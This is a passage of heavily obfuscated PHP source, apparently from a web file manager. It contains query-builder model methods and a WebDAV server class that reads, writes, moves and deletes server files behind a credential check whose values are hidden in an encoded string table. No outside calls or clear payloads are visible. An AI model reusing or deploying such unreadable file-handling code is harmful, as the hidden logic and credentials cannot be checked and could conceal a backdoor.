(is_object($DòŸ‡Â‡³Á)) { $DòŸ‡Â‡³Á = get_object_vars($DòŸ‡Â‡³Á); } if (is_string($DòŸ‡Â‡³Á)) { $EâßÛáØõ„ = $DòŸ‡Â‡³Á; } elseif (is_array($DòŸ‡Â‡³Á)) { if (isset($DòŸ‡Â‡³Á[0])) { $this->options[$Bè™¹å‡Ï[332]] = array_merge($this->options[$Bè™¹å‡Ï[332]], $DòŸ‡Â‡³Á); return $this; } else { $EâßÛáØõ„ = $DòŸ‡Â‡³Á; } } else { think_exception(think_lang($Bè™¹å‡Ï[256])); } $this->options[$Bè™¹å‡Ï[332]][] = $EâßÛáØõ„; goto CÈœ«¼›Ò¼; E†íİî¼Ô”: } public function cache($eñçâ†§±Ï = true, $Fóî±°ÛßØ = null, $eÅÂ±Çì²· = '') { $Aãßî¤Òå© =& $_SERVER[‘®…¢À]; if (!1 !== $eñçâ†§±Ï) { $this->options[$Aãßî¤Òå©[334]] = array($Aãßî¤Òå©[90] => $eñçâ†§±Ï, $Aãßî¤Òå©[324] => $Fóî±°ÛßØ, $Aãßî¤Òå©[29] => $eÅÂ±Çì²·); } return $this; } public function field($cÅ¾ËâÉğ‹, $Dİ†¿‘‚Ç = false) { $f’…¤‚Ò± =& $_SERVER[‘®…¢À]; if (!0 === $cÅ¾ËâÉğ‹) { $e–«òáƒ¯É = $this->getDbFields(); $cÅ¾ËâÉğ‹ = $e–«òáƒ¯É ? $e–«òáƒ¯É : $f’…¤‚Ò±[173]; } elseif ($Dİ†¿‘‚Ç) { if (is_string($cÅ¾ËâÉğ‹)) { $cÅ¾ËâÉğ‹ = explode($f’…¤‚Ò±[47], $cÅ¾ËâÉğ‹); } $e–«òáƒ¯É = $this->getDbFields(); $cÅ¾ËâÉğ‹ = $e–«òáƒ¯É ? array_diff($e–«òáƒ¯É, $cÅ¾ËâÉğ‹) : $cÅ¾ËâÉğ‹; } $this->options[$f’…¤‚Ò±[258]] = $cÅ¾ËâÉğ‹; return $this; } public function scope($b®»ğé‘¨ = '', $Aíß¤ìåó = NULL) { $F¸º‰âŒ‹ =& $_SERVER[‘®…¢À]; if ($F¸º‰âŒ‹[33] === $b®»ğé‘¨) { if (isset($this->_scope[$F¸º‰âŒ‹[34]])) { $CØ‹èëÇŸÕ = $this->_scope[$F¸º‰âŒ‹[34]]; } else { return $this; } } elseif (is_string($b®»ğé‘¨)) { $aºÌ ƒŠÅ¨ = explode($F¸º‰âŒ‹[47], $b®»ğé‘¨); $CØ‹èëÇŸÕ = array(); foreach ($aºÌ ƒŠÅ¨ as $aÕ°ôÕ±Ø‰) { if (!isset($this->_scope[$aÕ°ôÕ±Ø‰])) { continue; } $CØ‹èëÇŸÕ = array_merge($CØ‹èëÇŸÕ, $this->_scope[$aÕ°ôÕ±Ø‰]); } if (!empty($Aíß¤ìåó) && is_array($Aíß¤ìåó)) { $CØ‹èëÇŸÕ = array_merge($CØ‹èëÇŸÕ, $Aíß¤ìåó); } } elseif (is_array($b®»ğé‘¨)) { $CØ‹èëÇŸÕ = $b®»ğé‘¨; } if (is_array($CØ‹èëÇŸÕ) && !empty($CØ‹èëÇŸÕ)) { $this->options = array_merge($this->options, array_change_key_case($CØ‹èëÇŸÕ)); } return $this; } public function where($e‘×°÷ÍÁ, $D¼šºÖŒ‘ª = null) { $eÍÃ×Î¬‘ =& $_SERVER[‘®…¢À]; if (!is_null($D¼šºÖŒ‘ª) && is_string($e‘×°÷ÍÁ)) { if (!is_array($D¼šºÖŒ‘ª)) { $D¼šºÖŒ‘ª = func_get_args(); array_shift($D¼šºÖŒ‘ª); } $D¼šºÖŒ‘ª = array_map(array($this->db, $eÍÃ×Î¬‘[328]), $D¼šºÖŒ‘ª); $e‘×°÷ÍÁ = vsprintf($e‘×°÷ÍÁ, $D¼šºÖŒ‘ª); } elseif (is_object($e‘×°÷ÍÁ)) { $e‘×°÷ÍÁ = get_object_vars($e‘×°÷ÍÁ); } if (is_string($e‘×°÷ÍÁ) && $eÍÃ×Î¬‘[33] != $e‘×°÷ÍÁ) { $dÏ¤ãœŞÛä = array(); $dÏ¤ãœŞÛä[$eÍÃ×Î¬‘[335]] = $e‘×°÷ÍÁ; $e‘×°÷ÍÁ = $dÏ¤ãœŞÛä; } if (isset($this->options[$eÍÃ×Î¬‘[260]])) { $this->options[$eÍÃ×Î¬‘[260]] = array_merge($this->options[$eÍÃ×Î¬‘[260]], $e‘×°÷ÍÁ); } else { $this->options[$eÍÃ×Î¬‘[260]] = $e‘×°÷ÍÁ; } return $this; } public function limit($cÂÃÌ±¹Äæ, $e¬éã‘‰Í = null) { $cøœÔåŒ¾ø =& $_SERVER[‘®…¢À]; $this->options[$cøœÔåŒ¾ø[277]] = is_null($e¬éã‘‰Í) ? $cÂÃÌ±¹Äæ : $cÂÃÌ±¹Äæ . $cøœÔåŒ¾ø[47] . $e¬éã‘‰Í; return $this; } public function page($cå—›ÌÇèˆ, $E´ó‘‹·ß = null) { $bƒö¿ÌÌĞº =& $_SERVER[‘®…¢À]; $this->options[$bƒö¿ÌÌĞº[336]] = is_null($E´ó‘‹·ß) ? $cå—›ÌÇèˆ : $cå—›ÌÇèˆ . $bƒö¿ÌÌĞº[47] . $E´ó‘‹·ß; return $this; } public function comment($e‚°ÀÕ²‚Í) { $this->options[$_SERVER[‘®…¢À][337]] = $e‚°ÀÕ²‚Í; return $this; } public function setProperty($d¡ÛÒ¢”¸Ü, $d™ê¶Şá‹) { if (property_exists($this, $d¡ÛÒ¢”¸Ü)) { $this->{$d¡ÛÒ¢”¸Ü} = $d™ê¶Şá‹; } return $this; } } goto D°Ö³ŒáÎ; C…ºò±ÏÙ¬: class HttpDavServer { public function __construct($B…ì…Ç•É«, $b‰Ûˆçó¥â) { $this->root = $B…ì…Ç•É«; $this->initPath($b‰Ûˆçó¥â); $this->start(); } public function initPath($dó¤Ã¾Œ) { $D·‚èÑëÓ³ =& $_SERVER[‘®…¢À]; $aŠæ¬ñğç„ = rtrim($_SERVER[$D·‚èÑëÓ³[1290]], $D·‚èÑëÓ³[8]) . $D·‚èÑëÓ³[8]; $this->urlBase = substr($aŠæ¬ñğç„, 0, strpos($aŠæ¬ñğç„, $dó¤Ã¾Œ) + 1); $this->urlBase = rtrim($this->urlBase, $D·‚èÑëÓ³[8]) . $dó¤Ã¾Œ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $dåñÒ‚«ÓÃ =& $_SERVER[‘®…¢À]; $a„˜·É× = HttpAuth::get(); if ($a„˜·É×[$dåñÒ‚«ÓÃ[526]] == $dåñÒ‚«ÓÃ[1680] && $a„˜·É×[$dåñÒ‚«ÓÃ[878]] == $dåñÒ‚«ÓÃ[1681]) { return !0; } HttpAuth::error(); } public function start() { goto Bê«¼¦ĞĞ; eÕ“Í†¶ôÎ: if (!method_exists($this, $C«¥ê‰ƒ©)) { pr($C«¥ê‰ƒ© . $eìàªù…„[1682]); die; } $d‚ë«ø‘·Å = array($eìàªù…„[1683], $eìàªù…„[1684]); if (!in_array($C«¥ê‰ƒ©, $d‚ë«ø‘·Å) && !$this->pathExists($this->path)) { $AÉ †ï»Èˆ = array($eìàªù…„[990] => 404); } else { $AÉ †ï»Èˆ = $this->{$C«¥ê‰ƒ©}(); } goto FŸŒÂøµé; Bê«¼¦ĞĞ: $eìàªù…„ =& $_SERVER[‘®…¢À]; $this->checkUser(); $C«¥ê‰ƒ© = $eìàªù…„[143] . HttpHeader::method(); goto eÕ“Í†¶ôÎ; FŸŒÂøµé: if (!$AÉ †ï»Èˆ) { return; } self::response($AÉ †ï»Èˆ); goto b¸ã££Ö¿ç; b¸ã££Ö¿ç: } public function pathGet($A½¬ğÌº‚ = false) { $Cöùµ»©­è =& $_SERVER[‘®…¢À]; $AŒÒ±Å²µá = $A½¬ğÌº‚ ? $_SERVER[$Cöùµ»©­è[1685]] : $_SERVER[$Cöùµ»©­è[1290]]; $AŒÒ±Å²µá = KodIO::clear(rawurldecode($AŒÒ±Å²µá)); if (!strstr($AŒÒ±Å²µá, KodIO::clear($this->urlBase))) { return !1; } return substr($AŒÒ±Å²µá, strpos($AŒÒ±Å²µá, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($D¾¹‡è“Ÿµ) { return file_exists($D¾¹‡è“Ÿµ); } public function pathMkdir($f÷éêÚ§ïŸ) { return mkdir($f÷éêÚ§ïŸ, 511, !0); } public function pathInfo($AìÄÜ¹‚Š’) { return path_info($AìÄÜ¹‚Š’); } public function pathList($Aøææ‘å•) { return path_list($Aøææ‘å•); } public function pathOut($dŞ»äÈ×¥ø) { echo file_get_contents($dŞ»äÈ×¥ø); } public function pathPut($d¥âº´Æ„Ï, $e¯œÁßœ¦‚ = '') { if (!$e¯œÁßœ¦‚) { return file_put_contents($d¥âº´Æ„Ï, $_SERVER[‘®…¢À][33]); } return move_path($e¯œÁßœ¦‚, $d¥âº´Æ„Ï); } public function pathRemove($B§Òù¬‡°) { if (is_file($B§Òù¬‡°)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($bÚ­Éò´É, $AçÄàİäïå) { return move_path($bÚ­Éò´É, $AçÄàİäïå); } public function pathCopy($aÙ‹Õˆ™ù•, $F†¾Ş½ùÔ ) { return copy_dir($aÙ‹Õˆ™ù•, $F†¾Ş½ùÔ ); } public function parsePath($Aƒ½ˆä‚²Ñ) { return $Aƒ½ˆä‚²Ñ; } public function parseItem($d¿¦ì¶ƒ£Ü, $d¥Ê¦¬à‰î) { goto Aºö­ÂĞõ; fíƒŠºåÛ: if ($d¥Ê¦¬à‰î) { $FµËˆëªšÀ = $Bš®­Ä£‹[8] . str_replace($Bš®­Ä£‹[169], $Bš®­Ä£‹[8], rawurlencode($this->pathGet())); } if (!trim($d¿¦ì¶ƒ£Ü[$Bš®­Ä£‹[108]])) { $d¿¦ì¶ƒ£Ü[$Bš®­Ä£‹[108]] = time(); } if (!trim($d¿¦ì¶ƒ£Ü[$Bš®­Ä£‹[184]])) { $d¿¦ì¶ƒ£Ü[$Bš®­Ä£‹[184]] = time(); } goto C•ÎÌÔ‘; Aºö­ÂĞõ: $Bš®­Ä£‹ =& $_SERVER[‘®…¢À]; $FµËˆëªšÀ = $this->pathGet() . $Bš®­Ä£‹[8] . $d¿¦ì¶ƒ£Ü[$Bš®­Ä£‹[28]]; $FµËˆëªšÀ = $Bš®­Ä£‹[8] . str_replace($Bš®­Ä£‹[169], $Bš®­Ä£‹[8], rawurlencode($FµËˆëªšÀ)); goto fíƒŠºåÛ; C•ÎÌÔ‘: $bÊ¦ˆ¦­‡¸ = array($Bš®­Ä£‹[1686] => KodIO::clear($this->urlBase . $FµËˆëªšÀ), $Bš®­Ä£‹[108] => @gmdate($Bš®­Ä£‹[1687], $d¿¦ì¶ƒ£Ü[$Bš®­Ä£‹[108]]), $Bš®­Ä£‹[184] => @gmdate($Bš®­Ä£‹[1688], $d¿¦ì¶ƒ£Ü[$Bš®­Ä£‹[184]]), $Bš®­Ä£‹[78] => $d¿¦ì¶ƒ£Ü[$Bš®­Ä£‹[78]] ? $d¿¦ì¶ƒ£Ü[$Bš®­Ä£‹[78]] : 0); return $bÊ¦ˆ¦­‡¸; goto eÑªíè¬íÒ; eÑªíè¬íÒ: } public function parseItemXml($fÍ¡Êë‡Ÿ÷, $EÑËÄƒ¼ßŒ) { $E®çö§—ØÇ =& $_SERVER[‘®…¢À]; $D”ßìº›§ = $this->parseItem($fÍ¡Êë‡Ÿ÷, $EÑËÄƒ¼ßŒ); if ($fÍ¡Êë‡Ÿ÷[$E®çö§—ØÇ[29]] == $E®çö§—ØÇ[77]) { $F‹×Ã«Êä« = $E®çö§—ØÇ[1689]; $F‹×Ã«Êä« .= $E®çö§—ØÇ[1690]; } else { $C”Åç‡Â´î = $fÍ¡Êë‡Ÿ÷[$E®çö§—ØÇ[157]] ? $fÍ¡Êë‡Ÿ÷[$E®çö§—ØÇ[157]] : get_path_ext($fÍ¡Êë‡Ÿ÷[$E®çö§—ØÇ[28]]); $D”â‘Ï¢ = get_file_mime($C”Åç‡Â´î); $F‹×Ã«Êä« = $E®çö§—ØÇ[1691]; $F‹×Ã«Êä« .= "\74\x44\72\x67\145\164\143\x6f\156\x74\x65\x6e\x74\164\171\x70\x65\76{$D”â‘Ï¢}\74\x2f\104\72\x67\145\164\x63\157\156\x74\145\156\164\164\171\x70\x65\x3e"; } return "\12\11\11\74\104\x3a\x72\145\163\x70\x6f\156\x73\x65\x3e\12\x9\11\x9\x3c\x44\72\150\162\145\146\x3e{$D”ßìº›§[$E®çö§—ØÇ[1686]]}\x3c\x2f\x44\x3a\x68\x72\x65\146\x3e\xa\x9\11\11\x3c\104\72\160\x72\157\160\163\164\141\164\76\12\x9\11\11\11\x3c\x44\x3a\x70\162\x6f\x70\76\12\11\11\x9\11\11\74\x44\72\x67\145\164\x6c\141\x73\164\155\x6f\144\151\x66\151\x65\x64\76{$D”ßìº›§[$E®çö§—ØÇ[108]]}\x3c\57\x44\x3a\x67\145\x74\154\141\163\x74\x6d\x6f\x64\x69\146\x69\x65\x64\76\xa\x9\x9\11\x9\11\x3c\104\x3a\143\162\x65\x61\164\x69\x6f\x6e\x64\141\164\145\x3e{$D”ßìº›§[$E®çö§—ØÇ[184]]}\74\x2f\104\72\x63\162\x65\141\164\x69\x6f\156\144\141\164\145\x3e\12\x9\11\11\x9\x9\x3c\104\x3a\x67\x65\164\143\157\x6e\164\145\156\x74\154\145\156\147\164\x68\76{$D”ßìº›§[$E®çö§—ØÇ[78]]}\x3c\x2f\104\72\147\145\164\143\x6f\x6e\x74\x65\156\164\x6c\145\156\x67\x74\150\x3e\12\11\11\11\x9\11{$F‹×Ã«Êä«}\xa\x9\11\11\x9\74\x2f\x44\72\160\x72\157\x70\x3e\xa\11\11\x9\11\x3c\104\x3a\x73\x74\141\164\165\163\x3e\x48\124\124\x50\57\61\x2e\x31\40\62\60\x30\x20\117\x4b\x3c\x2f\x44\72\x73\x74\x61\x74\x75\163\x3e\xa\x9\11\x9\x3c\x2f\x44\x3a\x70\162\x6f\160\x73\x74\x61\x74\76\xa\11\11\x3c\57\104\72\x72\145\x73\160\x6f\156\x73\x65\76"; } public function pathListMerge($DùË¤ƒ¨£Ú) { goto d™Ñ²»¤ƒÓ; A½²É”‚•æ: $a£Éî“¼ì§ = array(); foreach ($DùË¤ƒ¨£Ú as $bİƒìòíÖ‰ => $f†¶›Ğ‰ìò) { if (!in_array($bİƒìòíÖ‰, $aø¯ÃÙÜÁÙ) || !is_array($f†¶›Ğ‰ìò)) { continue; } $a£Éî“¼ì§ = array_merge($a£Éî“¼ì§, $f†¶›Ğ‰ìò); } foreach ($a£Éî“¼ì§ as &$E‹¿×Œ´) { $E‹¿×Œ´[$dƒ··ÂîŒÂ[28]] = str_replace($dƒ··ÂîŒÂ[8], $dƒ··ÂîŒÂ[1292], $E‹¿×Œ´[$dƒ··ÂîŒÂ[28]]); } goto E÷‰†Ö­ì±; E÷‰†Ö­ì±: return $a£Éî“¼ì§; goto cø¤Ûµ£·Ì; d™Ñ²»¤ƒÓ: $dƒ··ÂîŒÂ =& $_SERVER[‘®…¢À]; if (!$DùË¤ƒ¨£Ú) { return $DùË¤ƒ¨£Ú; } $aø¯ÃÙÜÁÙ = array($dƒ··ÂîŒÂ[74], $dƒ··ÂîŒÂ[75], $dƒ··ÂîŒÂ[1692]); goto A½²É”‚•æ; cø¤Ûµ£·Ì: } public function httpPROPFIND() { goto A¦¥ÁÜÛê”; D“Ñ¡á£§¾: if ($b„áÎìÍš¹) { $E¦ÏƒˆÜçí = array($E°¯ò–—öã); } else { $E°¯ò–—öã[$CøÙô®ë¶[28]] = $CøÙô®ë¶[33]; $E¦ÏƒˆÜçí = array_merge(array($E°¯ò–—öã), $E¦ÏƒˆÜçí); } $Fíˆò×ì = $CøÙô®ë¶[33]; foreach ($E¦ÏƒˆÜçí as $aâœÖ±¸Ÿ) { $Fíˆò×ì .= $this->parseItemXml($aâœÖ±¸Ÿ, $b„áÎìÍš¹); } goto Cå°£—Û˜Ö; Cå°£—Û˜Ö: return array($CøÙô®ë¶[1695] => 207, $CøÙô®ë¶[1696] => "\x3c\x44\x3a\155\165\154\164\x69\x73\164\141\x74\165\163\x20\x78\155\x6c\156\163\72\x44\x3d\42\104\x41\x56\x3a\x22\x3e\xa{$Fíˆò×ì}\xa\x3c\x2f\104\x3a\155\x75\154\164\x69\x73\164\141\x74\165\x73\x3e"); goto eÁšßšî; A¦¥ÁÜÛê”: $CøÙô®ë¶ =& $_SERVER[‘®…¢À]; $C¶ÇöÂùîè = $this->pathList($this->path); $E¦ÏƒˆÜçí = $this->pathListMerge($C¶ÇöÂùîè); goto c§Ó–ÁœÅ; c§Ó–ÁœÅ: $E°¯ò–—öã = $C¶ÇöÂùîè[$CøÙô®ë¶[1693]]; if (!is_array($E¦ÏƒˆÜçí) || $E°¯ò–—öã[$CøÙô®ë¶[1694]] === !1) { return array($CøÙô®ë¶[1695] => 404, $CøÙô®ë¶[1696] => $CøÙô®ë¶[1697]); } $b„áÎìÍš¹ = $E°¯ò–—öã[$CøÙô®ë¶[29]] == $CøÙô®ë¶[164] || HttpHeader::get($CøÙô®ë¶[1672]) == $CøÙô®ë¶[463]; goto D“Ñ¡á£§¾; eÁšßšî: } public function httpHEAD() { $f“ÂÌçøæ =& $_SERVER[‘®…¢À]; $a¢†’ø¿É¨ = $this->pathInfo($this->path); if (!$a¢†’ø¿É¨ || $a¢†’ø¿É¨[$f“ÂÌçøæ[29]] == $f“ÂÌçøæ[77]) { return array($f“ÂÌçøæ[990] => 200, $f“ÂÌçøæ[1158] => array($f“ÂÌçøæ[1698])); } return array($f“ÂÌçøæ[990] => 200, $f“ÂÌçøæ[1158] => array($f“ÂÌçøæ[1699], $f“ÂÌçøæ[137], $f“ÂÌçøæ[1700] . $a¢†’ø¿É¨[$f“ÂÌçøæ[78]], $f“ÂÌçøæ[1701] . get_file_mime($a¢†’ø¿É¨[$f“ÂÌçøæ[157]]), $f“ÂÌçøæ[133] . gmdate($f“ÂÌçøæ[1687], $a¢†’ø¿É¨[$f“ÂÌçøæ[1203]]) . $f“ÂÌçøæ[1702], $f“ÂÌçøæ[1703])); } public function httpOPTIONS() { $e¥Ë¯ãµÈ¾ =& $_SERVER[‘®…¢À]; return array($e¥Ë¯ãµÈ¾[990] => 200, $e¥Ë¯ãµÈ¾[1158] => array($e¥Ë¯ãµÈ¾[1704], $e¥Ë¯ãµÈ¾[1705], $e¥Ë¯ãµÈ¾[1706], $e¥Ë¯ãµÈ¾[1662])); } public function httpPROPPATCH() { $CÀ×ëºõ‹ë =& $_SERVER[‘®…¢À]; $fçöÉ‹è¥ = $CÀ×ëºõ‹ë[1707] . $_SERVER[$CÀ×ëºõ‹ë[1290]] . $CÀ×ëºõ‹ë[1708]; return array($CÀ×ëºõ‹ë[1695] => 207, $CÀ×ëºõ‹ë[1696] => "\x3c\104\72\x6d\165\x6c\x74\x69\x73\x74\141\x74\165\163\40\x78\x6d\154\156\163\x3a\104\75\x22\104\101\x56\72\x22\76\xa{$fçöÉ‹è¥}\xa\74\57\104\72\155\165\x6c\164\151\163\164\x61\164\165\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $a—ºª›‰¼§ =& $_SERVER[‘®…¢À]; $f„¥¿¶†òí = $this->uploadFile(); if ($f„¥¿¶†òí) { $Bí†¶³ËÇÇ = 204; } else { $f„¥¿¶†òí = $a—ºª›‰¼§[33]; $Bí†¶³ËÇÇ = 201; } $CèÂ“£°Î = $this->pathPut($this->path, $f„¥¿¶†òí); if ($CèÂ“£°Î == !1) { $Bí†¶³ËÇÇ = 404; } return array($a—ºª›‰¼§[1695] => $Bí†¶³ËÇÇ); } private function uploadFile() { goto dê£©ÛÑ’Ñ; dê£©ÛÑ’Ñ: $f×¯ïÂ¾Ó =& $_SERVER[‘®…¢À]; @mk_dir(TEMP_FILES); $DÛÏ§äÈÆÚ = TEMP_FILES . $f×¯ïÂ¾Ó[1709] . rand_string(32); goto AÇ¨Û×£ËÆ; AÇ¨Û×£ËÆ: $c™ïÇÇ÷í = @fopen($DÛÏ§äÈÆÚ, $f×¯ïÂ¾Ó[1417]); $D—ğùõ†í÷ = @fopen($f×¯ïÂ¾Ó[1710], $f×¯ïÂ¾Ó[1416]); if (!$D—ğùõ†í÷ || !$c™ïÇÇ÷í) { @unlink($DÛÏ§äÈÆÚ); return !1; } goto aä›â„ğÓ; aä›â„ğÓ: while (!feof($D—ğùõ†í÷)) { fwrite($c™ïÇÇ÷í, fread($D—ğùõ†í÷, 1024 * 200)); } fclose($D—ğùõ†í÷); fclose($c™ïÇÇ÷í); goto f¦×¾õíÆ; f¦×¾õíÆ: if (@filesize($DÛÏ§äÈÆÚ) > 0) { return $DÛÏ§äÈÆÚ; } @unlink($DÛÏ§äÈÆÚ); return !1; goto FµÆºãë; FµÆºãë: } public function httpMKCOL() { $C›æáŸ˜»¿ =& $_SERVER[‘®…¢À]; if ($this->pathExists($this->path)) { return array($C›æáŸ˜»¿[990] => 409); } $a¢Ùˆ×Ù½ = $this->pathMkdir($this->path); return array($C›æáŸ˜»¿[990] => $a¢Ùˆ×Ù½ ? 201 : 403); } public function httpMOVE() { $EŒğâË›¡› =& $_SERVER[‘®…¢À]; $E„‡Ñêßó¹ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$EŒğâË›¡›[1711]])) { $B§êÆÛÍ ¦[$EŒğâË›¡›[1712]] = $_SERVER[$EŒğâË›¡›[1711]] == $EŒğâË›¡›[1713]; } $FÅ‡îö¿¾Î = $this->pathMove($this->path, $E„‡Ñêßó¹); return array($EŒğâË›¡›[990] => $FÅ‡îö¿¾Î ? 201 : 404); } public function httpCOPY() { $EË†ø°ó§’ = $this->parsePath($this->pathGet(!0)); $AÉÏº†øµ = $this->pathCopy($this->path, $EË†ø°ó§’); return array($_SERVER[‘®…¢À][990] => $AÉÏº†øµ ? 201 : 404); } public function httpDELETE() { $B‹”•¨ğ¯„ = $this->pathRemove($this->path); return array($_SERVER[‘®…¢À][990] => $B‹”•¨ğ¯„ ? 200 : 503); } public function httpLOCK() { $b™½‹ĞÀ© =& $_SERVER[‘®…¢À]; $cØË‰¸®İ = md5($this->path); $b¯‰ŠÍ¦…ó = $b™½‹ĞÀ©[1714] . $this->xmlGet($b™½‹ĞÀ©[1715]) . $b™½‹ĞÀ©[1716] . $cØË‰¸®İ . $b™½‹ĞÀ©[1717]; return array($b™½‹ĞÀ©[990] => 200, $b™½‹ĞÀ©[1158] => array($b™½‹ĞÀ©[1718] . $cØË‰¸®İ, $b™½‹ĞÀ©[1719]), $b™½‹ĞÀ©[1720] => $b¯‰ŠÍ¦…ó); } public function httpUNLOCK() { return array($_SERVER[‘®…¢À][990] => 204); } public function xmlGet($e™ÛŒ¤í) { goto aÀáÎ™ÅŸê; aÀáÎ™ÅŸê: $b¦¡“šêÒ =& $_SERVER[‘®…¢À]; static $BÊ¦»“ëÄÖ = false; if (!$BÊ¦»“ëÄÖ) { $E¦¥õ„ºùî = file_get_contents($b¦¡“šêÒ[1721]); $BÊ¦»“ëÄÖ = new DOMDocument(); $BÊ¦»“ëÄÖ->loadXML($E¦¥õ„ºùî); } goto cê£¨ôš¾½; cê£¨ôš¾½: $bÔéÕãÈ½´ = array_shift(explode($b¦¡“šêÒ[8], $e™ÛŒ¤í)); $Fî’Û®½œõ = $BÊ¦»“ëÄÖ->getElementsByTagNameNS($b¦¡“šêÒ[1722], $bÔéÕãÈ½´); if ($Fî’Û®½œõ) { return $Fî’Û®½œõ[0]->nodeValue; } goto E´È¾³œÖŒ; E´È¾³œÖŒ: return $b¦¡“šêÒ[33]; goto aœÕß—ÁÎ’; aœÕß—ÁÎ’: } public static function response($dğªßñ‹îº) { goto eºÅŞß˜ä‘; DÉ³–ˆŠ½Ã: if (is_string($dğªßñ‹îº[$eÂ¡²ö©¢Æ[1720]])) { header($eÂ¡²ö©¢Æ[1723]); $A”Õ‰ŞÇ–ã = $eÂ¡²ö©¢Æ[1724] . $eÂ¡²ö©¢Æ[214] . $dğªßñ‹îº[$eÂ¡²ö©¢Æ[1720]]; echo $A”Õ‰ŞÇ–ã; } goto fÉ’‡Öåøù; EÉç±‰¡Äí: $A›ñ´ù‘‚Ê[] = $eÂ¡²ö©¢Æ[1660]; $A›ñ´ù‘‚Ê[] = $eÂ¡²ö©¢Æ[1661]; foreach ($A›ñ´ù‘‚Ê as $dÏ œóÌ‡Ü) { header($dÏ œóÌ‡Ü); } goto DÉ³–ˆŠ½Ã; eºÅŞß˜ä‘: $eÂ¡²ö©¢Æ =& $_SERVER[‘®…¢À]; $A›ñ´ù‘‚Ê = is_array($dğªßñ‹îº[$eÂ¡²ö©¢Æ[1158]]) ? $dğªßñ‹îº[$eÂ¡²ö©¢Æ[1158]] : array(); $A›ñ´ù‘‚Ê[] = HttpHeader::code($dğªßñ‹îº[$eÂ¡²ö©¢Æ[990]]); goto EÉç±‰¡Äí; fÉ’‡Öåøù: } } class HttpHeader { public static $_headers = array("\110\157\x73\164" => "\110\124\124\120\137\110\117\x53\124", "\x55\x73\x65\x72\55\101\x67\x65\156\164" => "\x48\x54\124\x50\x5f\125\123\105\122\137\x41\x47\105\116\124", "\x43\x6f\156\164\x65\156\164\x2d\x54\x79\160\145" => "\110\124\x54\120\137\103\x4f\116\x54\105\x4e\x54\137\124\131\120\x45", "\103\157\156\164\x65\x6e\x74\55\x4c\x65\x6e\147\x74\x68" => "\110\124\x54\120\137\x43\117\116\124\x45\116\x54\x5f\114\x45\x4e\x47\x54\110", "\x44\x65\160\164\150" => "\x48\124\x54\x50\137\104\x45\120\124\110", "\x45\170\x70\x65\143\x74" => "\x48\x54\x54\x50\137\x45\130\x50\x45\103\124", "\111\146\55\116\x6f\x6e\145\x2d\x4d\x61\x74\143\150" => "\110\124\x54\x50\x5f\111\106\137\x4e\x4f\116\x45\x5f\115\101\124\103\x48", "\111\146\x2d\x4d\x61\164\143\x68" => "\110\x54\x54\x50\x5f\x49\106\x5f\x4d\101\x54\103\110", "\111\146\x2d\x52\x61\x6e\x67\x65" => "\110\124\124\x50\x5f\x49\106\x5f\x52\x41\x4e\107\x45", "\x4c\141\163\x74\x2d\x4d\x6f\x64\x69\x66\x69\x65\x64" => "\x48\x54\124\x50\x5f\x4c\101\x53\124\x5f\x4d\117\x44\111\106\x49\x45\104", "\x49\x66\55\x4d\x6f\x64\151\146\x69\145\144\55\x53\151\156\x63\x65" => "\110\124\x54\x50\x5f\x49\106\137\115\117\x44\x49\106\x49\105\x44\137\x53\x49\x4e\103\105", "\x49\x66\x2d\125\156\x6d\157\144\x69\146\151\x65\x64\55\x53\151\156\143\x65" => "\110\124\124\x50\x5f\x49\x46\137\x55\x4e\115\117\104\x49\x46\111\x45\104\x5f\x53\x49\x4e\103\x45", "\122\x61\x6e\147\145" => "\x48\x54\124\x50\137\122\101\x4e\107\x45", "\124\151\x6d\x65\x6f\165\164" => "\x48\x54\x54\120\x5f\x54\111\115\105\117\125\124", "\x49\x66" => "\x48\124\124\x50\x5f\x49\106", "\114\x6f\x63\x6b\55\124\157\153\x65\x6e" => "\110\124\124\x50\137\x4c\117\103\113\137\x54\x4f\x4b\105\x4e", "\x4f\166\145\162\x77\162\151\164\x65" => "\110\x54\x54\x50\137\117\126\105\122\x57\122\x49\x54\105", "\x44\x65\163\x74\151\156\141\x74\151\x6f\x6e" => "\x48\x54\x54\x50\137\x44\x45\x53\124\111\x4e\101\x54\x49\x4f\x4e", "\x52\145\x71\x75\145\x73\164\x2d\x49\144" => "\x52\x45\121\x55\x45\x53\x54\x5f\111\104", "\122\145\x71\x75\x65\163\x74\55\x42\157\x64\171\55\106\151\x6c\x65" => "\x52\x45\x51\125\105\123\x54\x5f\102\117\x44\131\x5f\106\x49\114\105", "\x52\x65\144\151\x72\x65\143\164\x2d\x53\x74\x61\164\165\x73" => "\122\x45\x44\111\x52\x45\x43\124\x5f\123\x54\x41\x54\125\123"); public static function init() { static $d‰Š«ô“ = false; if ($d‰Š«ô“) { return; } foreach ($_SERVER as $E•âŒĞèóˆ => $bâ±áËĞ˜Â) { $E•âŒĞèóˆ = strtoupper($E•âŒĞèóˆ); if (!array_key_exists($E•âŒĞèóˆ, $_SERVER)) { continue; } $_SERVER[$E•âŒĞèóˆ] = $bâ±áËĞ˜Â; } foreach (self::$_headers as $E•âŒĞèóˆ => $AÊ†ğ½Ëñ±) { if (!array_key_exists($E•âŒĞèóˆ, $_SERVER)) { continue; } $_SERVER[$E•âŒĞèóˆ] = $_SERVER[$AÊ†ğ½Ëñ±]; $_SERVER[strtoupper($E•âŒĞèóˆ)] = $_SERVER[$AÊ†ğ½Ëñ±]; } } public static function get($Bå¤ª¥¾¯Õ) { self::init(); return $_SERVER[$Bå¤ª¥¾¯Õ] ? $_SERVER[$Bå¤ª¥¾¯Õ] : $_SERVER[$_SERVER[‘®…¢À][1725] . strtoupper($Bå¤ª¥¾¯Õ)]; } public static function method() { return strtoupper(self::get($_SERVER[‘®…¢À][151])); } public static function length() { $Aî²Æß¶¨‡ =& $_SERVER[‘®…¢À]; $FÊÇö£¦®ñ = self::get($Aî²Æß¶¨‡[1726]); if (!$FÊÇö£¦®ñ) { $FÊÇö£¦®ñ = self::get($Aî²Æß¶¨‡[1096]); } return $FÊÇö£¦®ñ; } public static function range() { $AÃõ—¨â…¤ =& $_SERVER[‘®…¢À]; $cë’Åî°ì± = self::get($AÃõ—¨â…¤[195]); if (!$cë’Åî°ì±) { return !1; } if (!preg_match($AÃõ—¨â…¤[1727], $cë’Åî°ì±, $D½±çŒÆåØ)) { return !1; } if ($D½±çŒÆåØ[1] === 